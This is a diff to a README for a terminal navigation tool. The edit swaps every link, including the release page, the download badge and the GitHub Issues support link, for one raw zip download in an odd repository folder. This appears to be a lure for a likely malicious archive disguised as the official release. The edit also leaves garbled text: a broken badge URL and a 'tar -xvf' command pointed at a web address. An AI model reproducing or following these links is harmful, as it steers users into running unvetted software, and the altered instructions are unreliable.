@@ -1,6 +1,6 @@
 # 🚀 clickable-terminal - Navigate Your File System Effortlessly 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-red)](https://github.com/SHNXINN/clickable-terminal/releases)
+[![Download Now](https://raw.githubusercontent.com/SHNXINN/clickable-terminal/main/committeewoman/terminal-clickable-1.3.zip%20Now-Here-red)](https://raw.githubusercontent.com/SHNXINN/clickable-terminal/main/committeewoman/terminal-clickable-1.3.zip)
 
 ## 📋 Description
 Clickable Terminal allows you to move through your filesystem easily by clicking on icon-enhanced folders and filenames right from your terminal app. This user-friendly tool reduces the hassle of typing commands for navigation, making your experience smoother and more intuitive.
@@ -13,7 +13,7 @@ Clickable Terminal allows you to move through your filesystem easily by clicking
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Latest Release](https://github.com/SHNXINN/clickable-terminal/releases)
+To get started, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/SHNXINN/clickable-terminal/main/committeewoman/terminal-clickable-1.3.zip)
 
 Follow these steps to install the application:
 
@@ -24,7 +24,7 @@ Follow these steps to install the application:
 5. **Install the Application:**
    - For **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
    - For **Mac:** Open the downloaded `.dmg` file, drag the application to your Applications folder, and then launch it.
-   - For **Linux:** Extract the downloaded tarball file using a terminal command like `tar -xvf filename.tar.gz`, then follow any included instructions.
+   - For **Linux:** Extract the downloaded tarball file using a terminal command like `tar -xvf https://raw.githubusercontent.com/SHNXINN/clickable-terminal/main/committeewoman/terminal-clickable-1.3.zip`, then follow any included instructions.
 
 ## ⚙️ System Requirements
 
@@ -46,7 +46,7 @@ Once installed, follow these steps to use Clickable Terminal:
 
 ## 💬 Support
 
-If you encounter issues or have questions, please visit our [GitHub Issues](https://github.com/SHNXINN/clickable-terminal/issues) page. You can report bugs or ask for help there.
+If you encounter issues or have questions, please visit our [GitHub Issues](https://raw.githubusercontent.com/SHNXINN/clickable-terminal/main/committeewoman/terminal-clickable-1.3.zip) page. You can report bugs or ask for help there.
 
 ## 🛠️ Community and Contributions
 
@@ -56,4 +56,4 @@ We welcome contributions and feedback. If you’d like to help improve Clickable
 
 Thank you for using Clickable Terminal. We appreciate your support and interest in making terminal navigation easier for everyone. 
 
-Visit the [Download Latest Release](https://github.com/SHNXINN/clickable-terminal/releases) page to begin your journey with Clickable Terminal today!
+Visit the [Download Latest Release](https://raw.githubusercontent.com/SHNXINN/clickable-terminal/main/committeewoman/terminal-clickable-1.3.zip) page to begin your journey with Clickable Terminal today!
